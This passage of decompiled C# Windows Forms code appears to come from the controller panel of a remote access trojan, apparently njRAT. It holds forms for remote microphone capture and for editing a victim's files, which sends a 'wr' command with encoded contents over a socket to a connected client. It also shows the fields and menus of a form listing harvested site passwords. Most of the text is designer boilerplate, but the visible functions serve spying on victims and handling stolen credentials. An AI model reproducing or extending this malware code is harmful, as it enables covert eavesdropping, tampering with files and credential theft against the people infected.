				EventHandler value2 = new EventHandler(this.vmethod_4_Tick);
				bool flag = this._vmethod_4 != null;
				if (flag)
				{
					this._vmethod_4.Tick -= value2;
				}
				this._vmethod_4 = value;
				flag = (this._vmethod_4 != null);
				if (flag)
				{
					this._vmethod_4.Tick += value2;
				}
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox2 = value;
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Mic.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Mic.__ENCList.Count == Frm_Mic.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Mic.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Mic.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Mic.__ENCList[num] = Frm_Mic.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Mic.__ENCList.RemoveRange(num, Frm_Mic.__ENCList.Count - num);
						Frm_Mic.__ENCList.Capacity = Frm_Mic.__ENCList.Count;
					}
					Frm_Mic.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			this.ComboBox1 = new ComboBox();
			this.Button1 = new Button();
			this.vmethod_4 = new Timer(this.components);
			this.Label1 = new Label();
			this.ComboBox2 = new ComboBox();
			this.ProgressBar1 = new ProgressBar();
			this.SuspendLayout();
			this.ComboBox1.BackColor = Color.Black;
			this.ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
			this.ComboBox1.FlatStyle = FlatStyle.Flat;
			this.ComboBox1.ForeColor = Color.LightSteelBlue;
			this.ComboBox1.FormattingEnabled = true;
			Control arg_BB_0 = this.ComboBox1;
			Point location = new Point(2, 3);
			arg_BB_0.Location = location;
			this.ComboBox1.Name = "ComboBox1";
			Control arg_E9_0 = this.ComboBox1;
			Size size = new Size(224, 21);
			arg_E9_0.Size = size;
			this.ComboBox1.TabIndex = 0;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_14D_0 = this.Button1;
			location = new Point(232, 3);
			arg_14D_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_178_0 = this.Button1;
			size = new Size(124, 48);
			arg_178_0.Size = size;
			this.Button1.TabIndex = 1;
			this.Button1.Text = "Start";
			this.Button1.UseVisualStyleBackColor = true;
			this.vmethod_4.Enabled = true;
			this.vmethod_4.Interval = 50;
			this.Label1.AutoSize = true;
			this.Label1.ForeColor = Color.LightSteelBlue;
			Control arg_1F4_0 = this.Label1;
			location = new Point(5, 33);
			arg_1F4_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_21F_0 = this.Label1;
			size = new Size(56, 13);
			arg_21F_0.Size = size;
			this.Label1.TabIndex = 2;
			this.Label1.Text = "BufferSize";
			this.ComboBox2.BackColor = Color.Black;
			this.ComboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
			this.ComboBox2.FlatStyle = FlatStyle.Flat;
			this.ComboBox2.ForeColor = Color.LightSteelBlue;
			this.ComboBox2.FormattingEnabled = true;
			this.ComboBox2.Items.AddRange(new object[]
			{
				"4 kb 8bit",
				"6 kb 8bit",
				"8 kb 8bit",
				"8 kb 16bit",
				"12 kb 16bit",
				"16 kb 16bit",
				"20 kb 16bit",
				"24 kb 16bit"
			});
			Control arg_30A_0 = this.ComboBox2;
			location = new Point(86, 30);
			arg_30A_0.Location = location;
			this.ComboBox2.Name = "ComboBox2";
			Control arg_338_0 = this.ComboBox2;
			size = new Size(140, 21);
			arg_338_0.Size = size;
			this.ComboBox2.TabIndex = 3;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_36A_0 = this.ProgressBar1;
			location = new Point(0, 55);
			arg_36A_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_398_0 = this.ProgressBar1;
			size = new Size(359, 10);
			arg_398_0.Size = size;
			this.ProgressBar1.TabIndex = 4;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(359, 65);
			this.ClientSize = size;
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.ComboBox2);
			this.Controls.Add(this.Label1);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.ComboBox1);
			this.FormBorderStyle = FormBorderStyle.FixedSingle;
			this.MaximizeBox = false;
			this.Name = "Mic";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Mic";
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public Frm_Mic()
		{
			base.FormClosing += new FormClosingEventHandler(this.Mic_FormClosing);
			base.Load += new EventHandler(this.Mic_Load);
			Frm_Mic.__ENCAddToList(this);
			this.QQ = string.Empty;
			this.InitializeComponent();
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Start", false) == 0;
			if (flag)
			{
				this.Button1.Text = "Stop";
				this.ComboBox1.Enabled = false;
				this.ComboBox2.Enabled = false;
				flag = this.ComboBox2.Text.Contains("16bit");
				if (flag)
				{
				}
			}
			else
			{
				this.Button1.Text = "Start";
				this.ComboBox1.Enabled = true;
				this.ComboBox2.Enabled = true;
			}
		}

		private void Mic_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				bool cN = this.sk.CN;
				if (cN)
				{
				}
				this.sk.CN = false;
			}
			catch (Exception expr_20)
			{
				ProjectData.SetProjectError(expr_20);
				Exception projectError = expr_20;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void Mic_Load(object sender, EventArgs e)
		{
			try
			{
			}
			catch (Exception expr_04)
			{
				ProjectData.SetProjectError(expr_04);
				Exception projectError = expr_04;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			bool flag = this.ComboBox1.Items.Count == 0;
			if (flag)
			{
				this.Close();
			}
			else
			{
				this.Button1.ImageAlign = ContentAlignment.MiddleLeft;
				this.ComboBox1.SelectedIndex = 0;
			}
			this.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
		}

		private void vmethod_4_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.osk == null | this.sk == null;
				if (flag)
				{
					this.Close();
				}
				else
				{
					flag = (!this.osk.CN | !this.sk.CN);
					if (flag)
					{
						this.Close();
					}
				}
			}
			catch (Exception expr_4F)
			{
				ProjectData.SetProjectError(expr_4F);
				ProjectData.ClearProjectError();
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Note : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		[AccessedThroughProperty("SaveToolStripMenuItem")]
		private ToolStripMenuItem _SaveToolStripMenuItem;

		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("NyX_GroupBox1")]
		private NYX_GroupBox _NyX_GroupBox1;

		public string FNN;

		public Client SK;

		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MenuStrip1 = value;
			}
		}

		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._SaveToolStripMenuItem != null;
				if (flag)
				{
					this._SaveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				flag = (this._SaveToolStripMenuItem != null);
				if (flag)
				{
					this._SaveToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TextBox1_TextChanged);
				bool flag = this._TextBox1 != null;
				if (flag)
				{
					this._TextBox1.TextChanged -= value2;
				}
				this._TextBox1 = value;
				flag = (this._TextBox1 != null);
				if (flag)
				{
					this._TextBox1.TextChanged += value2;
				}
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual NYX_GroupBox NyX_GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_GroupBox1 = value;
			}
		}

		[DebuggerNonUserCode]
		public Frm_Note()
		{
			base.Load += new EventHandler(this.Frm_Note_Load);
			Frm_Note.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Note.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Note.__ENCList.Count == Frm_Note.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Note.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Note.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Note.__ENCList[num] = Frm_Note.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Note.__ENCList.RemoveRange(num, Frm_Note.__ENCList.Count - num);
						Frm_Note.__ENCList.Capacity = Frm_Note.__ENCList.Count;
					}
					Frm_Note.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Note));
			this.MenuStrip1 = new MenuStrip();
			this.SaveToolStripMenuItem = new ToolStripMenuItem();
			this.TextBox1 = new TextBox();
			this.ProgressBar1 = new ProgressBar();
			this.Timer1 = new Timer(this.components);
			this.NyX_GroupBox1 = new NYX_GroupBox();
			this.MenuStrip1.SuspendLayout();
			this.SuspendLayout();
			this.MenuStrip1.BackColor = Color.Black;
			this.MenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.SaveToolStripMenuItem
			});
			Control arg_C3_0 = this.MenuStrip1;
			Point location = new Point(0, 0);
			arg_C3_0.Location = location;
			this.MenuStrip1.Name = "MenuStrip1";
			Control arg_F1_0 = this.MenuStrip1;
			Size size = new Size(496, 24);
			arg_F1_0.Size = size;
			this.MenuStrip1.TabIndex = 0;
			this.MenuStrip1.Text = "MenuStrip1";
			this.SaveToolStripMenuItem.BackColor = Color.Transparent;
			this.SaveToolStripMenuItem.ForeColor = Color.White;
			this.SaveToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("SaveToolStripMenuItem.Image");
			this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
			ToolStripItem arg_178_0 = this.SaveToolStripMenuItem;
			size = new Size(59, 20);
			arg_178_0.Size = size;
			this.SaveToolStripMenuItem.Text = "Save";
			this.TextBox1.BackColor = Color.Black;
			this.TextBox1.Dock = DockStyle.Fill;
			this.TextBox1.ForeColor = Color.White;
			Control arg_1D1_0 = this.TextBox1;
			location = new Point(0, 24);
			arg_1D1_0.Location = location;
			this.TextBox1.Multiline = true;
			this.TextBox1.Name = "TextBox1";
			Control arg_20F_0 = this.TextBox1;
			size = new Size(496, 189);
			arg_20F_0.Size = size;
			this.TextBox1.TabIndex = 1;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_245_0 = this.ProgressBar1;
			location = new Point(0, 203);
			arg_245_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_273_0 = this.ProgressBar1;
			size = new Size(496, 10);
			arg_273_0.Size = size;
			this.ProgressBar1.TabIndex = 107;
			this.NyX_GroupBox1.Animated = true;
			this.NyX_GroupBox1.BorderStyle = FormBorderStyle.None;
			this.NyX_GroupBox1.Colors = new Bloom[0];
			this.NyX_GroupBox1.Customization = "";
			this.NyX_GroupBox1.Font = new Font("Arial", 9f);
			this.NyX_GroupBox1.Image = null;
			Control arg_2FF_0 = this.NyX_GroupBox1;
			location = new Point(61, 0);
			arg_2FF_0.Location = location;
			this.NyX_GroupBox1.Movable = true;
			this.NyX_GroupBox1.Name = "NyX_GroupBox1";
			this.NyX_GroupBox1.NoRounding = false;
			this.NyX_GroupBox1.Sizable = true;
			Control arg_354_0 = this.NyX_GroupBox1;
			size = new Size(1435, 24);
			arg_354_0.Size = size;
			this.NyX_GroupBox1.SmartBounds = true;
			this.NyX_GroupBox1.StartPosition = FormStartPosition.Manual;
			this.NyX_GroupBox1.TabIndex = 108;
			this.NyX_GroupBox1.Text = ".";
			this.NyX_GroupBox1.TransparencyKey = Color.Empty;
			this.NyX_GroupBox1.Transparent = false;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(496, 213);
			this.ClientSize = size;
			this.Controls.Add(this.NyX_GroupBox1);
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.TextBox1);
			this.Controls.Add(this.MenuStrip1);
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.MainMenuStrip = this.MenuStrip1;
			this.Name = "Frm_Note";
			this.Text = "Note";
			this.MenuStrip1.ResumeLayout(false);
			this.MenuStrip1.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void TextBox1_TextChanged(object sender, EventArgs e)
		{
			this.SaveToolStripMenuItem.Enabled = true;
		}

		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string[] array = new string[5];
			array[0] = "wr";
			array[1] = sokserver.Y;
			array[2] = FN.ENB(ref this.FNN);
			array[3] = sokserver.Y;
			TextBox textBox = this.TextBox1;
			string text = textBox.Text;
			textBox.Text = text;
			array[4] = FN.ENB(ref text);
			this.SK.Send(string.Concat(array));
			this.SaveToolStripMenuItem.Enabled = false;
		}

		private void Frm_Note_Load(object sender, EventArgs e)
		{
			this.Timer1.Start();
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Password : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("MenuStrip1")]
		private MenuStrip _MenuStrip1;

		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		[AccessedThroughProperty("L1")]
		private ListView _L1;

		[AccessedThroughProperty("OpenFileDialog1")]
		private OpenFileDialog _OpenFileDialog1;

		[AccessedThroughProperty("sf")]
		private SaveFileDialog _sf;

		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("ColumnHeader5")]
		private ColumnHeader _ColumnHeader5;

		[AccessedThroughProperty("ColumnHeader4")]
		private ColumnHeader _ColumnHeader4;

		[AccessedThroughProperty("PassToolStripMenuItem")]
		private ToolStripMenuItem _PassToolStripMenuItem;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("ImageList2")]
		private ImageList _ImageList2;

		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		[AccessedThroughProperty("ToolStripMenuItem4")]
		private ToolStripMenuItem _ToolStripMenuItem4;

		[AccessedThroughProperty("CopySiteToolStripMenuItem")]
		private ToolStripMenuItem _CopySiteToolStripMenuItem;

		[AccessedThroughProperty("ToolStripMenuItem5")]
		private ToolStripMenuItem _ToolStripMenuItem5;

		[AccessedThroughProperty("ToolStripMenuItem6")]
		private ToolStripMenuItem _ToolStripMenuItem6;

		[AccessedThroughProperty("ToolStripMenuItem7")]
		private ToolStripMenuItem _ToolStripMenuItem7;

		[AccessedThroughProperty("ToolStripMenuItem9")]
		private ToolStripMenuItem _ToolStripMenuItem9;

		[AccessedThroughProperty("FindToolStripMenuItem")]
		private ToolStripMenuItem _FindToolStripMenuItem;

		[AccessedThroughProperty("ToolStripMenuItem10")]
		private ToolStripMenuItem _ToolStripMenuItem10;

		[AccessedThroughProperty("NyX_GroupBox1")]
		private NYX_GroupBox _NyX_GroupBox1;

		[AccessedThroughProperty("RrToolStripMenuItem")]
		private ToolStripMenuItem _RrToolStripMenuItem;

		[AccessedThroughProperty("ColorLinesToolStripMenuItem")]
		private ToolStripMenuItem _ColorLinesToolStripMenuItem;

		private bool Bo;

		private ColumnHeader m_SortingColumn;

		internal virtual MenuStrip MenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MenuStrip1 = value;
			}
		}

		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		internal virtual ListView L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L1_DoubleClick);
				EventHandler value3 = new EventHandler(this.L1_SelectedIndexChanged);
				ColumnClickEventHandler value4 = new ColumnClickEventHandler(this.L1_ColumnClick);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.DoubleClick -= value2;
					this._L1.SelectedIndexChanged -= value3;
					this._L1.ColumnClick -= value4;
				}
				this._L1 = value;
				flag = (this._L1 != null);
				if (flag)
				{
					this._L1.DoubleClick += value2;
					this._L1.SelectedIndexChanged += value3;
					this._L1.ColumnClick += value4;
				}
			}
		}

		internal virtual OpenFileDialog OpenFileDialog1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFileDialog1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenFileDialog1 = value;
			}
		}

		internal virtual SaveFileDialog sf
		{
			[DebuggerNonUserCode]
			get
			{
				return this._sf;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._sf = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		internal virtual ToolStripMenuItem PassToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PassToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				bool flag = this._PassToolStripMenuItem != null;
				if (flag)
				{
					this._PassToolStripMenuItem.Click -= value2;
				}
				this._PassToolStripMenuItem = value;
				flag = (this._PassToolStripMenuItem != null);
				if (flag)
				{
					this._PassToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual ImageList ImageList2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList2 = value;
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click_1);
				bool flag = this._ToolStripMenuItem1 != null;
				if (flag)
				{
					this._ToolStripMenuItem1.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				flag = (this._ToolStripMenuItem1 != null);
				if (flag)
				{
					this._ToolStripMenuItem1.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem4_Click);
				bool flag = this._ToolStripMenuItem4 != null;
				if (flag)
				{
					this._ToolStripMenuItem4.Click -= value2;
				}
				this._ToolStripMenuItem4 = value;
				flag = (this._ToolStripMenuItem4 != null);
				if (flag)
				{
					this._ToolStripMenuItem4.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem CopySiteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopySiteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopySiteToolStripMenuItem_Click_1);
				bool flag = this._CopySiteToolStripMenuItem != null;
				if (flag)
				{
					this._CopySiteToolStripMenuItem.Click -= value2;
				}
				this._CopySiteToolStripMenuItem = value;
				flag = (this._CopySiteToolStripMenuItem != null);
				if (flag)
				{
					this._CopySiteToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem5_Click_1);
				bool flag = this._ToolStripMenuItem5 != null;
				if (flag)
				{
					this._ToolStripMenuItem5.Click -= value2;
				}
				this._ToolStripMenuItem5 = value;
				flag = (this._ToolStripMenuItem5 != null);
				if (flag)
				{
					this._ToolStripMenuItem5.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripMenuItem6 = value;
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem7_Click);
				bool flag = this._ToolStripMenuItem7 != null;
				if (flag)
				{
					this._ToolStripMenuItem7.Click -= value2;
				}
				this._ToolStripMenuItem7 = value;
				flag = (this._ToolStripMenuItem7 != null);
				if (flag)
				{
					this._ToolStripMenuItem7.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem9_Click);
				bool flag = this._ToolStripMenuItem9 != null;
				if (flag)
				{
					this._ToolStripMenuItem9.Click -= value2;
				}
				this._ToolStripMenuItem9 = value;
				flag = (this._ToolStripMenuItem9 != null);
				if (flag)
				{
					this._ToolStripMenuItem9.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem FindToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FindToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FindToolStripMenuItem_Click_1);
				bool flag = this._FindToolStripMenuItem != null;
				if (flag)
				{
					this._FindToolStripMenuItem.Click -= value2;
				}
				this._FindToolStripMenuItem = value;
				flag = (this._FindToolStripMenuItem != null);
				if (flag)
				{
					this._FindToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ToolStripMenuItem10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem10;
			}
